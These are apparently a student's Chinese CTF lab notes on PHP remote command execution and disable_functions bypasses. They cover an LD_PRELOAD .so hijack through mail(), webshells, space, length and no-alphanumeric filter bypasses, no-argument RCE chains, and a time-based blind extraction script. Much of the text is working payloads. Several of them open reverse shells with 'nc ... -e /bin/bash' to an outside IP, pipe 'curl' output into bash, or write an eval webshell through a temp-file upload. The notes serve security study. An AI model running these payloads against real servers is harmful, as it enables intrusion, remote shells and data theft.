# 注意事项

因为对于docker不熟悉以及bash,dash不太懂有几个注意事项

- docker exec -it [docker id] /bin/bash 进入docker容器中

- 如果docker崩溃就需要使用rm命令删除docker,再

	`sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085:85 -i -t mcc0624/cmd:latest bash -c '/etc/rc.local; /bin/bash'`重新配置docker

	再直接在docker界面输入命令

	`dpkg=reconfigure dash`     和    `yes`

- 使用`gcc -shared -fPIC demo.c -o demo.so`时,我发现似乎无法再次使用命令覆盖demo.so文件,所以应该需要设置为demo1.so,demo2.so,避免重复

- `docker exec -it [container_id or container_name] /bin/bash`

	- -it 表示 docker 将以交互模式和伪终端（pseudo-TTY）模式运行命令。
	- /bin/bash 则是要执行的命令或脚本，这里表示将会启动一个交互式 Bash shell。
	- [container_id or container_name] 为你要进入的实际容器的 ID 或名称。如果不确定确切的容器 ID 或名称，可以使用 # docker ps 命令打印当前已开启的容器列表，包括它们的 ID、名称、状态等信息。如果要查看当前所有的容器列表，可使用# docker ps -a。

	此外，补充一个**开启已有容器，就立即进入交互模式**的命令：
	`docker start -a -i [container_id or container_name]`



# php常见输出函数

## var_dump()



## print_r()



# php常见文件读取函数

## file_get_contents()

`file_get_contents('文件路径');`

## show_source()

`show_source('文件路径');`



# php常见目录读取函数

## scandir()

列出指定路径中的文件和目录(php5,php7,php8)







# php命令执行函数介绍

**注意:eval()函数是代码执行函数,不是命令执行函数**

常见函数:

`system `       `exec `          `passthru`            `shell_exec`

`反引号`        `popen`          `proc_open`            `pcntl_exec`

## system

`system(string $command,int &$return_var?)`

command:

执行command参数所指定的命令,并且输出执行结果

如果提供return_var参数,则外部命令执行后的返回状态将会被设置到此变量中

## exec

`exec(string $sommand,array &$output=?,int &$return_var=?)`

command:

要执行的命令,单独使用时只有最后一行结果,且不会回显

output:

用命令执行的输出填充此数组,每行输出填充数组中的一个元素,即逐行填充数组

可以借用print_r输出结果

## passthru

`passthru(string $command,int &$return_var=?)`

输出二进制数据,并且需要直接传送到浏览器

## shell_exec

`shell_exec(string $cmd)`

cmd:

要执行的命令



环境执行命令,并且将完整的输出输出以字符串的形式返回.功能等同于反引号

#类似函数return的返回



借用echo输出结果



## ``

实例:

`echo (反引号)$cmd(反引号)`

功能和shell_exec相同

## popen

`popen(string $cmd,string $mode)`

#没有回显

mode参数:

模式.'r'表示阅读,'w'表示写入

**fgets获取内容,print_r输出内容**

<?php

`$cmd = $_GET["cmd"];`

`$ben = popen($cmd,'r');`

`while ($s=fgets($ben)){`

​				print_r($s)

}

?>

## proc_open

`proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)`

#没有回显

## pcntl_exec

`pcntl_exec(string $path,array $args=?,array $envs=?)`



# 替换绕过函数过滤

  尝试使用漏掉的函数



# LD_PRELOAD绕过原理介绍

`mail`     #内嵌在php里

`imagick`      #需要扩展安装



`vim demo.php`

`strace -o 1.txt -f php demo.php`    #把demo.php执行的动作以文本形式放在1.txt

`cat 1.txt | grep execve`         #检查调用了哪些子进程

`readelf -Ws /usr/sbin/sendmail`    #查看sendmail有哪些库

`vim demo.c`    

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
        system("echo'xiaokeai?'");
}
int geteuid(){
        unsetenv("LD_PRELOAD");
        payload();
}

`gcc -shared -fPIC demo.c -o demo.so`

- `gcc`: GNU Compiler Collection 的命令，用于编译源代码。
- `-shared`: 这个选项告诉 GCC 编译器生成一个动态共享库，而不是可执行文件。动态共享库也称为共享对象（shared object）或动态链接库（dynamic link library）。
- `-fPIC`: 这个选项告诉编译器生成位置无关的代码（Position Independent Code，PIC），这是在创建共享库时通常需要的，以便共享库可以加载到任意内存位置而不引起问题。
- `demo.c`: 这是要编译的源代码文件名，其中包含了共享库的实现。
- `-o demo.so`: 这个选项指定编译输出的文件名为 `demo.so`，通常动态共享库的文件扩展名是 `.so`（Linux 系统上）或者 `.dll`（Windows 系统上）。

`vim demo.php`

<?php
putenv("LD_PRELOAD=./demo.so");
mail('','','');
?>

`php demo.php`



## mail函数命令执行的例题

绕过条件:

- 能够上传自己的.so文件
- 能够控制环境变量的值(设置LD_PRELOAD变量),比如putenv函数为被禁止
- 存在可以控制php启动外部程序的函数并能执行(因为新进程启动降价在LD_PRELOAD中的.so文件),比如mail(),imap_mail(),mb_send_mail()和error_log()等



构造payload

mail函数->调用子程序"/usr/bin/sendmail"->调用动态链接库geteuid

将demo.php和demo.so上传到蚁剑,访问demo.php



**简便方法:**

更改demo.c文件的内容为

`system("nc [ip地址] 7777 -e /bin/bash");`

再在kali上输入`nc -lnvp 7777`监听7777端口

可以执行shell命令



# EVIL_CMDLINE

当`LD_PRELOAD`无法反弹shell时可以尝试`EVIL_CMDLINE`



执行其他命令时需要修改demo2.so里的geteuid函数

把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令

具体如下

int geteuid() {

​	const char* cmdline = getenv("EVIL_CMDLINE");

​	if(getenv("LD_PRELOAD") == NULL){return 0;}

​    unsetenv("LD_PRELOAD");

​	system(cmdline);

}

创建666.php文件

<?php

\$cmd = \$_REQUEST["cmd"];

\$out_path = \$_REQUEST["outpath"];

\$evil_cmdline = \$cmd." > ".\$out_path." 2>&1";

echo "\<br /\>\<b\>cmdline:\</b\>".\$evil_cmdline;

putenv("EVIL_CMDLINE=".\$evil_cmdline);



\$so_path = \$_REQUEST["sopath"];

putenv("LD_PRELOAD=".\$so_path);

mail("","","");

echo "\<br /\>\<b\>output:\<b\>\<br/\>".nl2br(file_get_contents(\$out_path));

?>

解释:

要执行的系统命令cmd

outpath命令执行结果输出到指定路径下的文件

`2\>&1`将标准错误重定向到标准输出

打印显示实际在linux上执行的命令

将执行的命令,配置成系统环境变量`EVIL_CMDLINE`



sopath传入.so文件

将.so文件路径配置成系统环境变量`LD_PRELOAD`



echo把内容在网页上显示出来



把demo3.so和666.php上传到蚁剑后

构造payload:

666.php?cmd=ls&outpath=/tmp/benben&sopath=./demo3.so

cmd    #可控

out_path       输出的路径

sopath          指定恶意动态链接库



# 使用蚁剑插件

右键->加载插件->默认工具->`绕过disable-function`

选择模式可以选用`PHP7_GC_UAF`,点击开始



# pcntl_exec()函数

需单独加载插件

`pcntl_exec(string $path,array $args = ?,array $envs = ?)`

- 参数path:必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是`#!/usr/local/bin/perl`的perl脚本)
- 参数args:是一个要传递给程序的参数的字符串数组
- 参数envs:是一个要传递给程序作为环境变量的字符串数组

`# /bin/bash(path) -c /bin/ls(args)`

**info信息:**没有金庸`pcntl_exec()`

`pcntl_exec()`没有回显

- 解决方法一:cat文件并输出到有权限读取路径
- 解决方法而:shell反弹



POST或GET提交

`cmd=pcntl_exec("/bin/bash",array("-c","nc 172.21.205.184 7777 -e /bin/bash"));`

参数args:以数组的形式包裹起来

`-c`   执行二进制文件

`nc  `  反弹tcp连接到kali,kali监听端口

`-e /bin/bash`     返回命令行交互界面



# 操作系统链接符

`system("ls".$cmd);`

拼接命令

`;`				`&`				`&&`				`|`				`||`

## ;

使多个命令按顺序执行

## &(%26)

跟`;`命令差不多,不管前面命令有没有成功,都执行后面内容.

**需要使用url编码`%26`才能正常使用**

## &&

如果前面的命令执行成功,则执行后面的命令

**也要url编码**

## |

将前面的命令的输出作为后面命令的输入,把前面的命令的结果当成后面命令的参数;

都会执行,但只显示后面的命令执行结果

## ||

类似与if-else语句

前面命令成功,后面不会执行

前面命令失败,执行后面命令

实例:

`$cmd = $_GET["cmd"];`
`$cmd = $cmd." >/dev/null 2>&1";`
if(isset($cmd)){
  system($cmd);

只传入`?cmd=ls`输出内容会被重定向

传入`?cmd=ls||`可以不执行后面的命令



# 空格过滤绕过

绕过方法:

- 大括号{cat,flag.txt}

- `$IFS`代替空格;`$IFS`,`${IFS}`,`$IFS$9`

	linux下有一个特殊的环境变量角IFS,叫做内部字段分隔符

- 重定向字符`<`,`<>`;

	`<`表示的是输入重定向的意思,就是把`<`后面跟的文件取代键盘作为新的输入设备

	`?cmd=cat<flag.php`

	`<>`不推荐,`>`可能会导致多出来文件

- `%09`(Tab),`%20`(空格)



# 文件名过滤绕过

绕过方法:

- 通配符绕过`?`	`*`

	`?`在linux里面可以代替任何字母

	`*`可以进行模糊匹配

- 单引号,双引号绕过

	在被过滤的字符串中间插入`''`或`""`,起到空字符的作用,在linux中是可以正常执行的

- 反斜杠`\`绕过

	`cat f\lag.php`

	除了特殊字符去掉功能性;linux中`\`也有拼接的作用

- 特殊变量:`$1`	`$9`	`$@`	`$*`等

- 内敛执行:

	#自定义字符串,在拼接起来

	`a=fl;d=ag;cat $a$d.txt`

- 利用linux系统中的环境变量

	```
	echo $PATH                                                                                
	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
	```

	```
	echo f${PATH:5:1}                                                                         
	fl                      
	```



# 常见文件读取命令绕过

绕过方法:

- `tac`反向显示

- `more`一页一页地显示内容

- `less`和more类似
- `tail`    #查看末尾几行

- `nl`     #显示的时候带上行号

- `od`   #以二进制方式读取文件

	`system("od -A d -c flag.php")`

- `xxd`和od类似

- `sort`  #主要用于排序文件

	sort也被过滤时可以尝试使用绝对路径,即`/usr/bin/s?rt`

- `uniq`   #报告或删除文件中重复的行,可以直接当cat用

- `file -f`    #报错出具体内容

- `grep`       #在文本中查找特定字符串

	`system(grep { fl*)`

	从fl*中查找`{`



# 编码绕过

`命令编码后的字符串`    >>    `目标服务器`    >>    `执行命令`

​								绕过过滤				解码读取命令	

`echo Y2F0IGRlbW8yLmM= | base64 -d |bash`

也可以使用``包裹echo Y2F0IGRlbW8yLmM= | base64 -d #执行命令

或者用`$()`包裹来作为命令执行

以上可以用base64或base32

**hex编码:**

`echo "63 61 74 20 66 6c 61 67 2e 70 68 70" | xxd -r -p | bash`

**shellcode编码:**(适用于对方服务器没装xxd)

16进制的机器码

`printf "\x63\x61\x74"`

**注意:**echo可能无法正常执行



# 无回显时间盲注

页面无法shell反弹或者无法回显,或者没有写入权限,课长舒命令盲注

根据返回的时间来进行判断

相关命令:

- **sleep**

	`sleep 5`     #5秒后返回结果

- **awk NR**

	awk逐行获取数据

	`cat flag | awk NR==1` 

- **cut -c**

	`cat flag | awk NR==1 | cut -c 1`    #查看第一个字符

- **if语句**

	判断命令是否执行

	`if [ 2 > 1 ];then echo "right";fi`

	**注意:**上述命令每一个**空格**都必不可少,不然就会报错

	`if [ $(cat flag.php | awk NR==2 | cut -c 1) == h ];then echo "right";fi`

	`if [ $(cat 1.php | awk NR==2 | cut -c 1) == s ];then sleep 1;fi`

## 使用python脚本帮助运算

poc.py

```
import requests
import time
url = "http://172.21.205.184:18080/class08/1.php"
result = ""
for i in range(1,5):#行号
    for j in range(1,55):#每一行字符的数量
        #ascii码表
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```



# 长度过滤绕过

## `>`符号和`>>`符号

1.通过`>`创建文件

`echo "benben" > a`

2.`>>`追加内容

`echo "benben" >> a`

输出:

benben

dazhuang

## 命令换行符`\`

在没有写完的命令后加`\`,可以将一条命令写在多行



## `ls -t`命令

ls命令默认排序时`符号` >> `数字` >> `字母`

`ls -t`以时间顺序排序,越晚创建越优先显示

(`rm ./*`可以删除当前所有文件,包括特殊字符为名字的)

分别执行以下命令:

`>ag`

`>fl\\`

`>cat \\`

`ls -t > x`

`./x`或`sh x`               #如若权限不够可以运行`chmod +x x`

就可以查看flag的内容,相当于执行了cat flag

`sh`可以从文件中读取命令

## dir即*和rev

 `dir`和`ls`类似

有两个好处:

1.d在字母表比较靠前

2.`dir > b`写入文件后文件内容是在同一行显示的

### *

相当于`$(dir *)`

可以把第一个文件名(是命令的话)就会执行命令,返回执行结果,之后的文件名作为参数传入

例如:

```
dir                                                                                                        
cat  flag  
```

```
$(dir *)                                                                                                   
cjy6666666 
```

### rev

让文件内容倒叙之后输出(每个字符都倒过来)



## 长度限制为7的限制绕过

期望命令:

`cat flag | nc 172.21.205.184 7777`

`?cmd=>7777`

`?cmd=>84\ \\`

`?cmd=>5.1\\`

`?cmd=>1.20\\`

`?cmd=>72.2\\`

`?cmd=>\ 1\\`

`?cmd=>\ nc\\`

`?cmd=>\ \|\\`

`?cmd=>flag\\`

`?cmd=>\ \\`

`?cmd=>cat\\`

效果:

```
ls -t                                             
'cat\'  ' \'  'flag\'  ' |\'  ' nc\'  ' 1\'  '72.2\'  '1.20\'  '5.1\'  '84 \'  '7777'   flag   index.php 
```

再将文件名按顺序写入到文件a中

`?cmd=ls -t>a`

再执行文件a,相当于运行了`cat flag`

`?cmd=sh a`            #`./a`貌似不太好用,可能要改权限啥的

**可以使用脚本`7长度POC.py`**

发现一个问题:当输入`'>.20\\'`时,会生成不理想的文件,`.`应该放在数字中间,确保脚本正常运行

## 长度限制为5的限制过滤绕过

### curl命令

基本用法:

`curl URL`

`curl http://www.baidu.com `

执行后，`http://www.baidu.com` 的html就会显示在屏幕上了

`curl 172.21.205.184 | bash`

访问ip,并下载默认页面**index.html**

**| bash**:

把下载的index.html交给bash执行



**具体实施步骤:**

1.一台kali开启web服务(80端口),默认页面为index.html

   `touch index.html`    内容是:`nc 172.21.205.184 7777 -e /bin/bash`

   开启web服务 

​	`python -m http.server 80`

2.另一台kali监听7777端口

​	`nc -lvp 7777`

3.目标靶机执行命令`curl 172.21.205.184 | bash`

​	此命令访问ip并且下载默认页面index.html,把下载的index.html交给bash	执行

4.kali监听到7777端口





**期望执行的命令:**

`curl 172.21.205.184/|bash`

- 先构造ls -t>y
- 分解命令,创建文件
- sh执行脚本

默认排序无法正常排列出`ls -t>y`,ls\默认在最后面

解决方法:

- 先创建文件**ls\\**

- 再把**ls\\**写入文件`_`中

- 再用`>>`把` -t>y`追加到文件`_`中



**在执行脚本时,最后**

```
s.get(baseurl+"sh _")                                                                                          
s.get(baseurl+"sh y")
```

貌似没有正常执行,因此需要手动输入



## 长度限制为4的绕过方法

步骤一:`ls>>_`无法实现

构造`ls -t > g`                 #构造`ls -th > g`

`>g\;`      #为防止"g"后面有其他文件名造成影响,**;**阻断后面字符

`>g\>`

`>ht-`

`>sl`

`>dir`

`*>v`            #把前面内容输出到`v`中

`>rev`          #创建一个rev文件,配合`*`实现rev命令

`*v>x`           #写入后x内容为`ls  -th >g  ;g `



步骤二:构造反弹shell

采用十六进制

`curl 0xAC15CDB8|bash `

AC对应172        15对应21         CD对应205           B8对应184



- 监听端口7777

- 用python开启web服务

- 运行脚本`4长度POC.py`

**注意:**脚本最后两行`s.get`貌似没有执行,需要手动执行



# 无参数命令执行请求头RCE

`';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])`

`[^\W]+\((?R)?\)`

**[^\W]**匹配字母,数字,下划线

**\\(?\\)\\**匹配**"()"**,但是**()**内不能出现任何参数

**(?R)**表示递归,**a(b(c()))**都可以匹配到

**[^\W]+\\(?\\)\\**匹配到任何**a()**形式的字符串



总结一下:只有当提交函数并且没有任何参数时才可以正常执行



## HTTP请求(php7.3以后)

### getallheaders()

`getallheaders()`获取所有请求头

可以使用print_r(getallheaders());打印出来

getallheaders拿到的时请求头的倒序方式

### pos(),end()

`pos()`拿到第一项内容,搭配`getallheaders()`可以拿到最后一项内容

`end()`拿到最后一项内容



- 使用burp suite抓包,在请求头后面添加一项头部信息.例如`flag:system('ls')`

- payload:`?code=eval(pos(getallheaders()))`可以执行命令`system('ls')`

- 拿到flag

如果`getallheaders()`不能用,可以用`apache_request_headers()`代替



## 利用全局变量进RCE(php5/7)

### highligth_file()

高亮显示源码

### get_defined_vars()

返回所有已定义变量的值,所组成的数组



`?code=print_r(get_defined_vars());`

返回数组顺序为GET->POST->COOKIE->FILES

`?code=print_r(pos(get_defined_vars()));`

返回get数组

如果把命令改成`?code=print_r(end(pos(get_defined_vars())));&cmd=system('ls');`

可以回显`system('ls');`

把print_r换成代码执行函数eval即可执行命令

**脚本执行:**通过**全局变量RCE**脚本执行



## 利用session(php5)

只能在**php7**以下执行

### session_start()

启动新会话或者重用现有会话,成功开始会话返回true,否则返回false



`?code=print_r(session_id(session_start()));`

显示phpsessid



- 将print_r改成showsource     #读取文件源代码

	`?code=show_source(session_id(session_start()));`

- 用burp修改phpsessid的值为`./flag`

	#可以读取flag的源代码



- 修改外部函数为**eval**时,修改phpsessid的值为命令'phpinfo();'无法执行,要先把命令**hex**编码转换成十六进制,写入phpsessid

	再用**hex2bin()**将十六进制转换成命令

	`?code=show_source(hex2bin(session_id(session_start())));`



## scandir读取

### scandir() (5,7,8)

列出指定路径中的文件和目录(php5,php7,php8)

`print_r(scandir('C:'));`         #列出c盘目录下文件

### getcwd()  (4,5,7,8)

取得当前的工作目录

### current(),next() (4,5,7,8)

**current()**返回数组中的当前值(第一项)

和pos()类似

**next()**返回数组中的第二项

### array_reverse() (4,5,7,8)

返回倒序的数组

### array_flip(),array_rand()

`array_flip()`把数组的值和键对调

`array_rand()`从数组中随机取出一个键值或多个

### chdir()

系统调用函数(同**cd**)

用于改变当前目录

### strrev()

用于反转给定的字符串

### crypt()

用来加密

目前linux平台上加密的方法大致有**MD5,DES,3 DES**

### hebrevc()

数据流转换

### localeconv()

查看当前目录



### 查看当前目录下文件

两种方法:

第一种

`?code=print_r(localeconv());`

显示的数组第一项为"."

`?code(print_r(scandir(current(localeconv())));`

使用**scandir()**读取当前目录"."下所有文件名

`?code=show_source(current(array_reverse(scandir(current(localeconv())))));`

查看flag.php源代码

第二种

`?code=print_r(getcwd());`      #查看当前目录文件

`?code=print_r(scandir(getcwd()));`        #读取当前目录下文件

再配合**end()**和**show_source()**读取flag.php源代码





### 查看上级目录

`dirname()`  #上级目录()相当于`cd ..`

`?code=print_r(dirname(getcwd()));`     #上一级目录

`?code=print_r(scandir(dirname(getcwd())));`    #查看上一级目录

如果想查看上一级目录下最后一行的"info.php"的话,如果构造payload:

`?code=show_source(end(scandir(dirname(getcwd()))));`

发现无法进行读取.

因为**show_source()**还是基于当前目录执行的,**所以执行文件时必须往上返回一级目录**

解决方法:

利用`chdir()`改变目录

`?code=show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));`

当读取的文件既不在第一个,也不在最后一个,可以使用payload:

`?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));`



其他**payload**:

`?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(next(scandir(getcwd())))))))))))));`



`?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));`



### 查看根目录

`?code=print_r(crypt(serialize(array())));`

**serialize**序列化

**crypt**单项字符串散列加密,可能会出现`/`    #出现在最后一个字符

使用**strrev**反转字符串

再使用ord()和chr()函数,这两个函数只对第一个字符进行转码

最终**payload**:

`?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));`

因为array_rand和crypt都是随机,需要大量次数堆积才能拿到flag

使用工具burpsuite抓包之后发送到`intruder`

设置sniger模式(相同payload多次攻击)

设置payload类型为数值类型.从1到10000,间隔为1

点击自动添加payload位置

**这里有个小bug不知道什么原因我只添加一个位置时无法爆出flag,点击add payload两次,在添加一个payload后才可以爆出flag**

开始攻击



# 无字母数字过滤绕过

思路:利用**异或运算**

使用`异或运算POC生成脚本.php`

`$shell`变量输入需要构造的payload

比如执行phpinfo()函数,构造payload

`?cmd=$_="+(+).&/"^"[@[@@@@";$_();`

直接execute无法成功,因为**+**会被解释为空格,可以对**?cmd=**后面的部分进行url编码   注意:不能对前面编码



## assert()拼接(PHP5)

`<php`

`$a = 'assert';`

`$b = '_POST';`

`$c = $$b;`

`$a($c['_']);`

`?>`

代码作用:使用assert,若传入值是字符串,会被当做PHP代码执行

把a,b,c分别替换为`_,__,___`

`assert`和`_POST`使用异或脚本生成对应形式替换

构造payload:

`?cmd=$_= "!((%)(" ^ "@[[@[\\";$__ = "!+/((" ^ "~{{|";$___ = $$__;$_($___['_']);`                                                   #上面少了个反引号



**PHP<7.0时:**

assert会将传入的参数试着作为PHP代码去执行，这个参数可以是一个函数或者是一个表达式

**PHP>7.0时:**

assert在更新后无法将使用字符串作为参数，而传入GET或POST的数据默认的类型就是字符串，这就导致了assert不适宜再用来直接写马。



## 反引号``(PHP7)

(反引号)`$_POST[_]`(反引号);

payload:

?cmd=$_="!+/(("^"~{`{|";$__=$$_;`$__[_]`;     #注意要url编码在execute

利用hackbar上传post:

`_=nc 172.21.205.184 7777 -e /bin/bash`

在此之前在linux上监听端口:

`nc -lvp 7777`



# 无字母数字取反绕过

**取反运算:**

`~()`

例如'a'取反运算是9e

```
<?php
$a="%9e";
$b=~(urldecode($a));
echo $b;
?>
```

可以不出现a就得到字符a

使用**取反运算POC生成脚本.php**

## PHP5下使用assert

构造payload:

`?cmd=$_=~"%9e%8c%8c%9a%8d%8b";$__=~"%a0%af%b0%ac%ab";$___=$$__;$_($___['_']);`

同时使用hackbar提交post

`_=system('cmd');`

执行命令

## PHP7下使用反引号

后再payload:

?cmd=$_=~"%a0%af%b0%ac%ab";$__=$$_;`$__[_]`;     **#奇奇怪怪,粘贴上去会出现原来形式**

?cmd=$_=~("%a0%af%b0%ac%ab");$__=$$_;`$__[_]`;

在搭配nc命令链接到linux bash上面



# 无字母数字自增绕过

自增`++`

`$_=[].'''`

`echo $_;`         #[]数组   .  拼接''字符串    输出Array(字符串)

读取'Array'的0号字符

`echo $_[$__];`               #``$__`变量不存在,假值为0



## assert(PHP5)

`assret($_POST['_']);`

使用**自增POC生成脚本.php**        

- #我发现post=POST能生成`_POST`,如果上传post=`_POST`则不行,应该是脚本问题

上传的payload是:

?cmd加上脚本生成的内容    加上`$__ = $$____;$_($__[_]);`

其中`$_`是ASSERT     `$____`是_POST

搭配post提交



## 反引号(PHP7)

使用**自增POC生成脚本.php**        

`cmd=assert`

`post=POST`

上传的payload是

?cmd加上脚本生成的内容    加上\$\_\_=\$\$\_\_\_\_;\`\$\_\_[\_]\`;



# 无字母数字特殊符号过滤绕过

## \_\_过滤绕过

`?cmd=?>>?=phpinfo();?>`    可以直接执行

POST:

?cmd=?><?=`{${~"%a0%af%b0%ac%ab"}['-']}`;?>

post提交:   -=ls     执行命令



GET:

?cmd=?><?=`{${~"%a0%b8%ba%ab"}['-']}`;?>&-=ls



## 下划线和\$过滤绕过

### (PHP7)

**call_user_func()**

payload:

`?cmd=(~"%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c")(~"%8c%86%8c%8b%9a%92",~"%93%8c",'');`

相当于注入

`(call_user_func)(system,ls,'');`



### (PHP5)

文件读取:

PHP中POST上传文件会把我们上传的文件暂存在**/tmp**目录下,

默认文件名是**phpXXXXXX**,文件名最后六个字符是随机的大小写字母

使用通配符

`./???/?????????`         可以匹配到./tmp/phpXXXXXX

​                                           匹配东西太多,通常会报错

`./???/????????[@-[]`          [@-[]表示ascii在@和[之间的字符,也就是大写字母,保障最后一位为大写字母



具体步骤:

1.构造一个文件上传的POST数据包

2.PHP页面生成临时文件phpXXXXXX,存储在/tmp目录下

3.执行指令`./???/????????[@-[]`,读取文件,执行其中命令

使用burp suite拦截带post数据包之后,

把HOST以下的内容改成

**以下**             

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type:multipart/form-data;boundary=--------123
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 188


----------123
Content-Disposition:form-data;name="file";filename="1.txt"

echo "<?php eval(\$_POST['shell']);" > /www/admin/localhost_80/wwwroot/class11/success.php
----------123--



注意:上述一句话木马有一个\,如果没有\无法正常运行(不知道为啥)



再修改第一行POST请求

POST /class11/3.php?cmd=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?> HTTP/1.1